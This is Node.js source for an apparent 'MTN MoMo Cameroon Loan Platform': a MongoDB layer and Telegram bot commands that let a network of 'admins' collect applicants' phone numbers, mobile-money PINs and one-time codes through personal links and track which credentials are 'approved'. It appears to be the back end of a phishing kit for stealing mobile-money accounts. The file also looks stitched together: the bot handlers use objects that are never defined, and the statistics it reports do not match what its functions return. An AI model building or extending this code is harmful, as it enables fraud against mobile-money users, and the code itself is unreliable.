const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = 'mtn_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Connect to MongoDB
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI);
        await client.connect();

        db = client.db(DB_NAME);

        console.log('✅ Connected to MongoDB successfully');

        await createIndexes();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 });

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}
// ==========================================
// 7. TELEGRAM COMMAND & CALLBACK HANDLERS
// ==========================================
function setupCommandHandlers() {
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (adminId) {
            if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                return bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\nYour administrative access has been temporarily suspended.`, { parse_mode: 'Markdown' });
            }

            const admin = await db.getAdmin(adminId);
            const isSuperAdmin = adminId === 'ADMIN001' || admin?.role === 'super_admin';

            let welcomeMessage = `
👋 *Welcome back, ${admin?.name || 'Admin'}!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Standard Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
            `.trim();

            if (isSuperAdmin) {
                welcomeMessage += `

*Admin Management (Super Admin Only):*
/addadmin <Name> | <Email> | <ChatID>
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/admins - List all admins

*Messaging:*
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
                `.trim();
            }

            bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown', disable_web_page_preview: true });
        } else {
            bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Cameroon Loan Platform*
Your Chat ID is: \`${chatId}\`
Please provide this ID to your Super Administrator to request access.
            `.trim(), { parse_mode: 'Markdown' });
        }
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;
        bot.sendMessage(chatId, `🔗 *Your Personal Link:*\n${WEBHOOK_URL}?admin=${adminId}`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `👤 *Admin Profile*\n*Name:* ${admin.name}\n*Email:* ${admin.email}\n*ID:* \`${admin.adminId}\`\n*Role:* ${admin.role}\n*Status:* ${admin.status}`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *ADMINISTRATIVE STATISTICS*
------------------------------
📋 Total Applications: \`${stats.total}\`
⏳ PIN Pending: \`${stats.pinPending}\`
✅ PIN Approved: \`${stats.pinApproved}\`
⏳ SMS Pending: \`${stats.smsPending}\`
✅ SMS Approved: \`${stats.smsApproved}\`
⏳ OTP Pending: \`${stats.otpPending}\`
🎉 Fully Approved: \`${stats.fullyApproved}\`
        `.trim(), { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || !isAdminActive(chatId)) return;

        const pendingApps = await db.getPendingApplications(adminId);
        if (pendingApps.length === 0) {
            return bot.sendMessage(chatId, '✅ No pending applications found.');
        }

        let text = `📋 *PENDING APPLICATIONS (${pendingApps.length})*\n\n`;
        pendingApps.slice(0, 10).forEach(app => {
            text += `• Ref: \`${app.id}\`\n  Phone: \`${app.phoneNumber}\`\n  Status: PIN(${app.pinStatus}) SMS(${app.smsStatus}) OTP(${app.otpStatus})\n\n`;
        });
        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    });

    // --- SUPER ADMIN MANAGEMENT COMMANDS ---

    bot.onText(/\/admins/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
        }

        const admins = await db.getAllAdmins();
        let text = `👥 *REGISTERED ADMINS (${admins.length})*\n\n`;
        admins.forEach(a => {
            text += `• *${a.name}* (\`${a.adminId}\`)\n  Role: ${a.role} | Status: ${a.status} | ChatID: \`${a.chatId}\`\n\n`;
        });
        bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') {
            return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
        }

        const parts = match[1].split('|').map(p => p.trim());
        if (parts.length < 3) {
            return bot.sendMessage(chatId, '❌ Format error. Use:\n`/addadmin Name | Email | ChatID`', { parse_mode: 'Markdown' });
        }

        const [name, email, targetChatId] = parts;
        const newAdminId = `ADM-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;

        try {
            await db.saveAdmin({
                adminId: newAdminId,
                name,
                email,
                chatId: targetChatId,
                role: 'admin',
                status: 'active'
            });
            adminChatIds.set(newAdminId, targetChatId);
            bot.sendMessage(chatId, `✅ *Admin Created Successfully!*\nID: \`${newAdminId}\`\nName: ${name}\nChat ID: \`${targetChatId}\``, { parse_mode: 'Markdown' });
        } catch (err) {
            bot.sendMessage(chatId, `❌ Error creating admin: ${err.message}`);
        }
    });

    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1].trim();
        if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot pause Super Admin.');

        await db.updateAdminStatus(targetAdminId, 'paused');
        pausedAdmins.add(targetAdminId);
        bot.sendMessage(chatId, `⏸️ Admin \`${targetAdminId}\` has been paused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1].trim();
        await db.updateAdminStatus(targetAdminId, 'active');
        pausedAdmins.delete(targetAdminId);
        bot.sendMessage(chatId, `▶️ Admin \`${targetAdminId}\` has been unpaused.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1].trim();
        if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot remove Super Admin.');

        await db.deleteAdmin(targetAdminId);
        adminChatIds.delete(targetAdminId);
        pausedAdmins.delete(targetAdminId);
        bot.sendMessage(chatId, `🗑️ Admin \`${targetAdminId}\` has been removed.`, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const broadcastMsg = match[1];
        const admins = await db.getAllAdmins();
        let count = 0;

        for (const admin of admins) {
            if (admin.chatId) {
                bot.sendMessage(admin.chatId, `📢 *BROADCAST FROM SUPER ADMIN*\n\n${broadcastMsg}`, { parse_mode: 'Markdown' }).catch(() => {});
                count++;
            }
        }
        bot.sendMessage(chatId, `✅ Broadcast sent to ${count} admins.`);
    });

    bot.onText(/\/send (\S+) (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId || adminId !== 'ADMIN001') return;

        const targetAdminId = match[1];
        const directMsg = match[2];
        const targetAdmin = await db.getAdmin(targetAdminId);

        if (!targetAdmin?.chatId) {
            return bot.sendMessage(chatId, `❌ Admin ID \`${targetAdminId}\` not found or has no Chat ID.`, { parse_mode: 'Markdown' });
        }

        bot.sendMessage(targetAdmin.chatId, `📩 *MESSAGE FROM SUPER ADMIN*\n\n${directMsg}`, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
    });
}
// ==========================================
// ENVIRONMENT LOGS OPERATIONS
// ==========================================

async function logAdminActivity(adminId, action, details = {}) {
    try {
        const logEntry = {
            adminId,
            action,
            details,
            timestamp: new Date().toISOString()
        };
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
        console.log(`📝 Environment Log [${action}] recorded for admin: ${adminId}`);
    } catch (error) {
        console.error('❌ Error recording environment log:', error);
    }
}

async function getEnvironmentLogs(query = {}, limit = 100) {
    try {
        return await db.collection(COLLECTIONS.ENVIRONMENT_LOGS)
            .find(query)
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();
    } catch (error) {
        console.error('❌ Error getting environment logs:', error);
        return [];
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId)        throw new Error('Admin ID is required (adminId or id property)');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const adminDocument = {
            adminId,
            name:      adminData.name,
            email:     adminData.email,
            chatId:    adminData.chatId,
            status:    adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        console.log(`💾 Saving admin to database:`, {
            adminId: adminDocument.adminId,
            name:    adminDocument.name,
            email:   adminDocument.email,
            chatId:  adminDocument.chatId,
            status:  adminDocument.status
        });

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        
        // Log admin creation activity
        await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminData.name, email: adminData.email });

        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        
        // Log admin update activity
        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);

        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        
        // Log status change activity
        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });

        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        
        // Log admin deletion activity
        await logAdminActivity(adminId, 'ADMIN_DELETED', {});

        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id:             appData.id,
            adminId:        appData.adminId,
            adminName:      appData.adminName,
            phoneNumber:    appData.phoneNumber,
            pin:            appData.pin,
            pinStatus:      appData.pinStatus  || 'pending',
            otpStatus:      appData.otpStatus  || 'pending',
            otp:            appData.otp        || null,
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount:  appData.previousCount   || 0,
            timestamp:      appData.timestamp || new Date().toISOString()
        });

        // Log application save activity if adminId is present
        if (appData.adminId) {
            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
        }

        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );

        // Fetch application to log admin activity if available
        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
        }

        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const otpPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins        = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const otpPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { otpStatus: 'wrongpin_otp' },
                { otpStatus: 'wrongcode' }
            ]
        });
        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,

    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    logAdminActivity,
    getEnvironmentLogs,

    getAdminStats,
    getStats,
    getPerAdminStats,

    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
